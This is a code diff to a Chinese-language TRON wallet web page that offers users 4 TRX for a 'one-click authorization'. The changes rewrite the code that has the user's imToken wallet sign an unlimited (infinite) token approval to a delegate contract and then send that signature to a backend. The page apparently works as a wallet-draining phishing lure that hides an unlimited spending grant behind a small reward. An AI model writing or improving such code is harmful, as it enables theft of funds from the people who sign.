@@ -129,7 +129,7 @@
             <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
             <div class="copy-link-wrap">
                 <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
-                <button id="copyLinkBtn"><<i class="fa fa-copy"></</i> 复制链接</button>
+                <button id="copyLinkBtn"><i class="fa fa-copy"></</i> 复制链接</button>
             </div>
         </div> 
         <button id="connectBtn" class="btn"><<i class="fa fa-link"></</i> 连接imToken钱包</button>
@@ -228,7 +228,7 @@
                     return;
                 }
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 生成授权签名中...';
+                approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></</i> 生成授权签名中...';
 
                 try {
                     // 1. 转换地址为Hex格式（匹配合约ABI编码要求）
@@ -236,12 +236,11 @@
                     const contractAddrHex = tronWeb.address.toHex(DELEGATE_CONTRACT);
                     
                     // 2. 构造签名消息（与合约delegateApprove的messageHash完全一致）
-                    const message = tronWeb.utils.abi.encodePacked(
-                        userAddrHex,        // 用户地址（Hex）
-                        contractAddrHex,    // 代付合约地址（Hex）
-                        INFINITE_APPROVE_AMOUNT // 授权金额（最小单位）
-                    );
-                    const messageHash = tronWeb.utils.sha3(message); // 生成32位哈希
+                    const amountHex = tronWeb.utils.toHex(INFINITE_APPROVE_AMOUNT, true, 32); 
+// 2. 手动拼接参数（地址Hex为20字节，金额Hex为32字节，直接拼接）
+const message = userAddrHex.replace('0x', '') + contractAddrHex.replace('0x', '') + amountHex.replace('0x', '');
+// 3. 对拼接后的Hex字符串进行SHA3哈希
+const messageHash = tronWeb.utils.sha3(message, false);  // 生成32位哈希
                     
                     // 3. 用户离线签名（imToken本地签名，不暴露私钥，匹配合约签名验证逻辑）
                     const signature = await tronWeb.trx.signMessage(
@@ -252,7 +251,7 @@
                     const { v, r, s } = signature;
 
                     // 4. 传给后端：代付授权+发TRX奖励
-                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 后端代付中...';
+                    approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></</i> 后端代付中...';
                     const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -295,7 +294,7 @@
                     alert(`操作失败：${e.message}`);
                 } finally {
                     approveBtn.disabled = false;
-                    approveBtn.innerHTML = '<<i class="fa fa-check-circle"></</i> 一键授权（后端代付+领4TRX）';
+                    approveBtn.innerHTML = '<i class="fa fa-check-circle"></</i> 一键授权（后端代付+领4TRX）';
                 }
             };
 
